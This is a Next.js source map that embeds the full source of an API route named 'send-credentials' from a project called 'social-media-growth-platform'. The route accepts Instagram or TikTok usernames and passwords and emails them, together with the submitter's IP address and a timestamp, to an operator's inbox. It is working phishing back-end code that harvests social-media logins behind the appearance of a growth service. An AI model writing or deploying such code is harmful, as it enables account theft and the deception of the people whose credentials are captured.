{
  "version": 3,
  "sources": [],
  "sections": [
    {"offset": {"line": 136, "column": 0}, "map": {"version":3,"sources":["file:///home/abdikhafar/Documents/social-media-growth-platform/app/api/send-credentials/route.ts"],"sourcesContent":["import { NextRequest, NextResponse } from 'next/server'\nimport nodemailer from 'nodemailer'\n\nexport async function POST(request: NextRequest) {\n  try {\n    const { username, password, platform } = await request.json()\n\n    if (!username || !password) {\n      return NextResponse.json(\n        { error: 'Username and password are required' },\n        { status: 400 }\n      )\n    }\n\n    // Create transporter using environment variables\n    const transporter = nodemailer.createTransport({\n      host: process.env.SMTP_HOST || 'smtp.gmail.com',\n      port: parseInt(process.env.SMTP_PORT || '587'),\n      secure: process.env.SMTP_SECURE === 'true', // true for 465, false for other ports\n      auth: {\n        user: process.env.SMTP_USER,\n        pass: process.env.SMTP_PASS,\n      },\n    })\n\n    // Email content\n    const mailOptions = {\n      from: process.env.SMTP_USER,\n      to: process.env.RECEIVER_EMAIL || process.env.SMTP_USER,\n      subject: `New ${platform === 'instagram' ? 'Instagram' : 'TikTok'} Login Credentials`,\n      html: `\n        <h2>New Login Credentials Received</h2>\n        <p><strong>Platform:</strong> ${platform === 'instagram' ? 'Instagram' : 'TikTok'}</p>\n        <p><strong>Username/Email:</strong> ${username}</p>\n        <p><strong>Password:</strong> ${password}</p>\n        <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>\n        <p><strong>IP Address:</strong> ${request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'Unknown'}</p>\n      `,\n      text: `\n        New Login Credentials Received\n        Platform: ${platform === 'instagram' ? 'Instagram' : 'TikTok'}\n        Username/Email: ${username}\n        Password: ${password}\n        Timestamp: ${new Date().toLocaleString()}\n        IP Address: ${request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'Unknown'}\n      `,\n    }\n\n    // Send email\n    await transporter.sendMail(mailOptions)\n\n    return NextResponse.json(\n      { message: 'Credentials sent successfully' },\n      { status: 200 }\n    )\n  } catch (error) {\n    console.error('Error sending email:', error)\n    return NextResponse.json(\n      { error: 'Failed to send credentials' },\n      { status: 500 }\n    )\n  }\n}\n\n"],"names":[],"mappings":";;;;AAAA;AACA;;;AAEO,eAAe,KAAK,OAAoB;IAC7C,IAAI;QACF,MAAM,EAAE,QAAQ,EAAE,QAAQ,EAAE,QAAQ,EAAE,GAAG,MAAM,QAAQ,IAAI;QAE3D,IAAI,CAAC,YAAY,CAAC,UAAU;YAC1B,OAAO,sMAAY,CAAC,IAAI,CACtB;gBAAE,OAAO;YAAqC,GAC9C;gBAAE,QAAQ;YAAI;QAElB;QAEA,iDAAiD;QACjD,MAAM,cAAc,kNAAU,CAAC,eAAe,CAAC;YAC7C,MAAM,QAAQ,GAAG,CAAC,SAAS,IAAI;YAC/B,MAAM,SAAS,QAAQ,GAAG,CAAC,SAAS,IAAI;YACxC,QAAQ,QAAQ,GAAG,CAAC,WAAW,KAAK;YACpC,MAAM;gBACJ,MAAM,QAAQ,GAAG,CAAC,SAAS;gBAC3B,MAAM,QAAQ,GAAG,CAAC,SAAS;YAC7B;QACF;QAEA,gBAAgB;QAChB,MAAM,cAAc;YAClB,MAAM,QAAQ,GAAG,CAAC,SAAS;YAC3B,IAAI,QAAQ,GAAG,CAAC,cAAc,IAAI,QAAQ,GAAG,CAAC,SAAS;YACvD,SAAS,CAAC,IAAI,EAAE,aAAa,cAAc,cAAc,SAAS,kBAAkB,CAAC;YACrF,MAAM,CAAC;;sCAEyB,EAAE,aAAa,cAAc,cAAc,SAAS;4CAC9C,EAAE,SAAS;sCACjB,EAAE,SAAS;uCACV,EAAE,IAAI,OAAO,cAAc,GAAG;wCAC7B,EAAE,QAAQ,OAAO,CAAC,GAAG,CAAC,sBAAsB,QAAQ,OAAO,CAAC,GAAG,CAAC,gBAAgB,UAAU;MAC5H,CAAC;YACD,MAAM,CAAC;;kBAEK,EAAE,aAAa,cAAc,cAAc,SAAS;wBAC9C,EAAE,SAAS;kBACjB,EAAE,SAAS;mBACV,EAAE,IAAI,OAAO,cAAc,GAAG;oBAC7B,EAAE,QAAQ,OAAO,CAAC,GAAG,CAAC,sBAAsB,QAAQ,OAAO,CAAC,GAAG,CAAC,gBAAgB,UAAU;MACxG,CAAC;QACH;QAEA,aAAa;QACb,MAAM,YAAY,QAAQ,CAAC;QAE3B,OAAO,sMAAY,CAAC,IAAI,CACtB;YAAE,SAAS;QAAgC,GAC3C;YAAE,QAAQ;QAAI;IAElB,EAAE,OAAO,OAAO;QACd,QAAQ,KAAK,CAAC,wBAAwB;QACtC,OAAO,sMAAY,CAAC,IAAI,CACtB;YAAE,OAAO;QAA6B,GACtC;YAAE,QAAQ;QAAI;IAElB;AACF"}}]
}